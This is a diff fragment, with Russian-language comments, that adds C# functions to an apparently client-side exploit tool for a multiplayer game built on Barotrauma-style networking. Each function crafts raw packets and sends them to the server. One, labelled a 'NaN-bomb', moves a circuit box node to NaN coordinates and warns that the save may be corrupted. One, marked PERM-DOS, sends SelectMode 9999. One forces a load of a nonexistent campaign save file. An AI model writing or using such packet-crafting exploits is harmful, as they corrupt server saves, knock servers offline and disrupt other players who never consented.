+        //  [SAVE] CircuitBox NaN
+        // ========================================================
+        private static string ExecCircuitBoxNaN()
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
+            Item cbItem = FindCircuitBox();
+            if (cbItem == null) { return "рядом нет circuit box"; }
+
+            int cbIndex = 0;
+            ushort nodeId = 1;
+            try
+            {
+                for (int i = 0; i < cbItem.Components.Count; i++)
+                {
+                    if (cbItem.Components[i] is CircuitBox) { cbIndex = i; break; }
+                }
+                // достаём первый известный клиенту ID узла через reflection
+                var cb = cbItem.GetComponent<CircuitBox>();
+                var compsProp = typeof(CircuitBox).GetProperty("Components",
+                    BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance);
+                if (compsProp != null)
+                {
+                    var list = compsProp.GetValue(cb) as IEnumerable<object>;
+                    if (list != null)
+                    {
+                        foreach (var node in list)
+                        {
+                            var idProp = node.GetType().GetProperty("ID",
+                                BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance);
+                            if (idProp != null)
+                            {
+                                object v = idProp.GetValue(node);
+                                if (v is ushort u && u != 0) { nodeId = u; break; }
+                            }
+                        }
+                    }
+                }
+            }
+            catch { }
+
+            IWriteMessage payload = new WriteOnlyMessage();
+            payload.WriteRangedInteger(0, 0, 12);                       // EventType.ComponentState
+            int comps = 1;
+            try { comps = Math.Max(1, cbItem.Components.Count); } catch { }
+            payload.WriteRangedInteger(cbIndex, 0, comps - 1);
+            payload.WriteByte((byte)CircuitBoxOpcode.MoveComponent);    // = 3
+            CircuitBoxMoveComponentEvent move = new CircuitBoxMoveComponentEvent(
+                ImmutableArray.Create<ushort>(nodeId),
+                ImmutableArray.Create<CircuitBoxInputOutputNode.Type>(),
+                ImmutableArray.Create<ushort>(nodeId),
+                new Vector2(float.NaN, float.NaN));
+            ((INetSerializableStruct)move).Write(payload);
+
+            SendEntityEventRaw(cbItem.ID, payload);
+            return "NaN-бомба ушла в «" + cbItem.Name + "» (узел " + nodeId + "). ★ Сейв может испортиться!";
+        }
+
+        // ========================================================
+        //  [PERM-DOS] SelectMode 9999
+        // ========================================================
+        private static string ExecSelectMode()
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            IWriteMessage msg = new WriteOnlyMessage();
+            msg.WriteByte((byte)ClientPacketHeader.SERVER_COMMAND);
+            msg.WriteUInt16((ushort)ClientPermissions.SelectMode);
+            msg.WriteUInt16(9999);
+            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+            return "SelectMode-бомба ушла (сработает при перме SelectMode, иначе — отказ в логе)";
+        }
+
+        // ========================================================
+        //  [WINDOW] LoadCampaign мусорный файл
+        // ========================================================
+        private static string ExecLoadGarbage()
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            IWriteMessage msg = new WriteOnlyMessage();
+            msg.WriteByte((byte)ClientPacketHeader.CAMPAIGN_SETUP_INFO);
+            msg.WriteBoolean(false);                       // isNew = false (загрузка)
+            msg.WritePadBits();
+            msg.WriteString("C:\\zzz_garbage_nonexistent.save");
+            msg.WriteBoolean(false);
+            msg.WritePadBits();
+            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+            return "LoadCampaign-бомба ушла (сработает в окне 586/соло, иначе сервер молчит)";
+        }
+
+        private static ushort CurrentLocIndex()
+        {
+            try
+            {
+                var map = GameMain.GameSession?.Campaign?.Map;
+                if (map?.CurrentLocation != null)
+                {
+                    int idx = map.Locations.IndexOf(map.CurrentLocation);
+                    if (idx >= 0) { return (ushort)idx; }
+                }
+            }
+            catch { }
+            return 0;
         }
 
         private static void CloseWindow()
